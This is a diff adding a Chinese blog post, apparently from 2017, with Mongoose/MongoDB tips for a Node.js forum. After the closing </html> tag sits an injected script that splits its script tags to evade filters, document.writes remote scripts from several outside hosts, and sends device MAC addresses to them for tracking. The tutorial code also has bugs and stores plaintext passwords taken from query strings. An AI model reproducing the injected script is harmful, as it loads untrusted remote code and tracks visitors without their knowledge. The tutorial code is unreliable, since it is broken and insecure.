@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>node+mongo填坑（一）</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="../../../../css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="../../../index.html" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">node+mongo填坑（一）</h1>
+                <h3 class="date">20170319</h3>
+                <div class="clearfix typo">
+                    最近在用nodejs和MongoDB写个论坛，在这里记录下遇到的一些坑。<br>
+                    连接mongodb时使用的是mongoose模块，安装和使用方法如下：<br>
+                    安装：<br>
+                    <code>
+                        npm install mongoose --save
+                    </code><br>
+                    使用：<br>
+                    let mongoose = require('mongoose');<br>
+
+                    mongoose主要分为三个部分：schema(映射)，model(模型)，entity(实体),三者的关系是：<br>
+                    schema生成model，model生成entity，其中model和entity可以对数据库进行操作，实例如下：<br>
+                    <pre>
+                        <code>// 定义Schema
+        UserSchema = new mongoose.Schema(
+                  {
+                  user: {// 真实姓名
+                        type: String
+                  },
+                  password: { // 密码
+                        type: String
+                  },
+        shopCar: {
+                  type: Array,
+                  // default: []
+                  }
+                  },{collection: 'user'});
+        // 定义Model
+        let UserModel = mongoose.model('user', UserSchema);
+        let TestEntity = new User({
+                  user : req.query.user,
+                  password  : req.query.password,
+                  shopCar: []
+                  });
+                        </code>
+                    </pre>
+
+                    坑提示：：**其中在定义schema的时候，如果不加第二个参数，那么即使你在model中定义了表名为‘user’，mongoose会智能的在表名末尾添加一个's'，那么你查询的表就会变成‘users’表，所以，为了安全，务必加上{ collection: 'table_name' }<br>
+
+                        坑提示：：在接口的处理内，处理完后记得把数据库的连接关闭：：mongoose.connection.close()。
+                    <br>
+
+
+                        建议：生成schema和model的代码单独放在一个文件中，module.export暴露model的接口，需要使用时在主文件中require即可，节约每次都要重新写的问题。
+                    <br>
+
+                    问题：在向数据库添加时可以使用 <br>
+                    <pre>
+                        <code>
+         TestEntity.save(function(error,doc){
+            if(error){
+                console.log("error :" + error);
+            }else{
+                console.log(doc);
+                db.close();
+            }
+        });
+                        </code>
+                    </pre>
+
+                    entity对象尽量每个schema对象定义的key都写上，不然又可能会添加失败
+                    提示：save要重启数据库才会看到添加后的数据
+                    提示：如果想要查询一个表的所有数据，可以使用如下方法：
+                    <pre>
+                        <code>
+          User.find({}, function (error, docs) {
+            if(error) {
+                console.log("error :" + error);
+            } else {
+                console.log(docs);
+            })
+                        </code>
+                    </pre>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.info/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+                <!--<a href="https://github.com/SolidZORO/vodka" target="_blank">vodka</a>-->
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
